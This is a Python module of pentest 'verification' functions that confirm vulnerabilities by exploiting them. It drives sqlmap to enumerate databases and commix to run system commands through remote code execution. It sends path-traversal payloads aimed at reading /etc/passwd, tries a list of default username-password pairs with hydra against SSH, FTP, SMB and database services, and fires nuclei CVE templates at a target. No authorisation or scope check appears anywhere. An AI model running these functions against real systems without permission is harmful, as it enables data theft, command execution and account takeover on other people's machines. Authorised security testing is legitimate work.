"""Verification tools — confirm vulnerabilities with exploitation."""
import subprocess
import shlex


def verify_sqli(url: str, param: str = "") -> str:
    """Verify SQL injection by extracting database info."""
    cmd = f"sqlmap -u {shlex.quote(url)} --batch --dbs --threads=4"
    if param:
        cmd += f" -p {shlex.quote(param)}"
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
        return (result.stdout + result.stderr).strip()[:10000] or "Could not confirm SQL injection"
    except subprocess.TimeoutExpired:
        return "Verification timed out"
    except Exception as e:
        return f"Error: {e}"


def verify_rce(url: str, param: str = "", method: str = "GET") -> str:
    """Verify RCE by executing system commands."""
    cmd = f"commix -u {shlex.quote(url)} --batch --os-cmd='id; whoami; uname -a'"
    if param:
        cmd += f" -p {shlex.quote(param)}"
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
        return (result.stdout + result.stderr).strip()[:5000] or "Could not confirm RCE"
    except subprocess.TimeoutExpired:
        return "Verification timed out"
    except Exception as e:
        return f"Error: {e}"


def verify_lfi(url: str, param: str = "file") -> str:
    """Verify LFI by reading sensitive files."""
    import httpx

    payloads = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "/etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
    ]

    results = []
    for payload in payloads:
        test_url = f"{url}?{param}={payload}" if "?" not in url else url.replace(f"{param}=", f"{param}={payload}")
        try:
            r = httpx.get(test_url, timeout=10.0, verify=False, follow_redirects=True)
            if "root:" in r.text or "/bin/" in r.text:
                results.append(f"[CONFIRMED] LFI with payload: {payload}\n{r.text[:2000]}")
                break
            results.append(f"[FAILED] {payload} — no sensitive content")
        except Exception as e:
            results.append(f"[ERROR] {payload}: {e}")

    return "\n".join(results) if results else "Could not confirm LFI"


def verify_default_creds(target: str, service: str) -> str:
    """Test default credentials on a service."""
    creds = [
        ("admin", "admin"), ("admin", "password"), ("root", "root"),
        ("admin", ""), ("admin", "123456"), ("test", "test"),
        ("user", "user"), ("guest", "guest"), ("admin", "admin123"),
        ("root", "toor"), ("admin", "changeme"), ("operator", "operator"),
    ]

    results = [f"Testing default credentials on {service}://{target}"]
    for user, pwd in creds:
        # Use hydra for network services
        if service in ("ssh", "ftp", "telnet", "mysql", "postgres", "smb"):
            cmd = f"hydra -l {shlex.quote(user)} -p {shlex.quote(pwd)} {shlex.quote(target)} {shlex.quote(service)} -t 1 -f"
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                if "successfully completed" in result.stdout.lower() or "valid" in result.stdout.lower():
                    results.append(f"  [SUCCESS] {user}:{pwd}")
                    return "\n".join(results)
            except Exception:
                pass
        results.append(f"  [FAILED] {user}:{pwd}")

    results.append("No default credentials worked")
    return "\n".join(results)


def verify_cve(target: str, cve_id: str) -> str:
    """Attempt to exploit a specific CVE."""
    # Use nuclei with specific CVE template
    cmd = f"nuclei -u {shlex.quote(target)} -tags {shlex.quote(cve_id.lower())} -silent -nc"
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
        output = result.stdout.strip()
        if output:
            return f"[CONFIRMED] {cve_id} exploitable on {target}:\n{output}"
        return f"{cve_id} not confirmed on {target} (template may not exist)"
    except Exception as e:
        return f"Error: {e}"
